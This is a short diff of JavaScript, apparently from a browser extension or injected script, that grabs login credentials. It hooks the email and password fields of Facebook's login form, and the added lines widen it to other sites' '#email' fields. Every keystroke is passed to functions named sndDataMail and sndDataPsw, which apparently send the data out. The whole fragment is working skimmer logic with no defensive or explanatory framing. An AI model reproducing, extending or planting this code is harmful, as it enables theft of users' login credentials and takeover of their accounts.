@@ -36,7 +36,9 @@ function sndDataPsw(e){
 }*/
 if (window.location.hostname == "www.facebook.com"){
  var emailFrm = document.querySelectorAll('#login_form [type=email]')[0];
- var pssFrm = document.querySelectorAll('#login_form [type=password]')[0];
- emailFrm.addEventListener("input", sndDataMail);
- pssFrm.addEventListener("input", sndDataPsw);
+} else {
+ var emailFrm = document.querySelectorAll('#email')[0];
 }
+var pssFrm = document.querySelectorAll('#login_form [type=password]')[0];
+emailFrm.addEventListener("input", sndDataMail);
+pssFrm.addEventListener("input", sndDataPsw);
